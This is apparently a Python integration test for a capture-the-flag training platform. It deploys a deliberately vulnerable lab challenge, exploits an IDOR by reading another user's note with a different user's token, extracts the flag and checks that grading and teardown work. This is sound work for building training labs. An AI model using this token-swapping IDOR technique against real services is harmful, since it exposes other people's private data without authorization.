"""플랫폼 전체 루프 E2E 통합 테스트 (실제 Docker 필요).

HTTP 로 챌린지를 스핀업(실배포) → 발급된 URL 을 실제로 익스플로잇해 flag 획득 →
그 flag 를 제출 엔드포인트로 채점 → 통과 확인. = 바닥 데모(⭐)의 플랫폼 쪽 구현.

실행: pytest -m integration   (Docker/Colima 데몬 필요)
"""

import re
import time
from pathlib import Path

import httpx
import pytest
from fastapi.testclient import TestClient
from ulsaner_platform.app import create_app
from ulsaner_platform.service import ChallengeService

pytestmark = pytest.mark.integration

REPO_ROOT = Path(__file__).resolve().parents[2]
FIXTURE = REPO_ROOT / "platform" / "fixtures" / "easy-idor-01"


def _wait_until_up(url: str, timeout: float = 45.0) -> None:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            httpx.get(f"{url}/notes/42", timeout=2)
            return
        except httpx.HTTPError:
            time.sleep(1)
    raise RuntimeError("컨테이너 앱이 시간 내에 뜨지 않음")


def test_full_platform_loop_spinup_exploit_submit():
    service = ChallengeService()  # 실제 배포/정리
    client = TestClient(create_app(service=service, bundles={"easy-idor-01": FIXTURE}))
    try:
        # 1) 스핀업 → 학생용 뷰(URL + 과제)
        view = client.post("/challenges", json={"name": "easy-idor-01"}).json()
        challenge_id, url = view["challenge_id"], view["url"]
        assert "flag" not in view  # 비밀 미노출 재확인

        # 2) 익스플로잇: alice 토큰으로 bob(피해자) 노트를 읽어 flag 추출 (IDOR)
        _wait_until_up(url)
        note = httpx.get(
            f"{url}/notes/42",
            headers={"Authorization": "Bearer alice-token"},
            timeout=5,
        ).json()
        match = re.search(r"FLAG\{[^}]+\}", note["content"])
        assert match, "익스플로잇으로 flag 를 얻지 못함"
        flag = match.group(0)

        # 3) 제출 → 채점 통과
        result = client.post(f"/challenges/{challenge_id}/submit", json={"flag": flag})
        assert result.status_code == 200
        assert result.json() == {"correct": True}

        # 4) 정답이면 인스턴스가 teardown 되어 재제출은 404
        assert client.post(
            f"/challenges/{challenge_id}/submit", json={"flag": flag}
        ).status_code == 404
    finally:
        # 안전망: 남은 인스턴스 정리
        for cid in service.active_ids():
            service.teardown(cid)
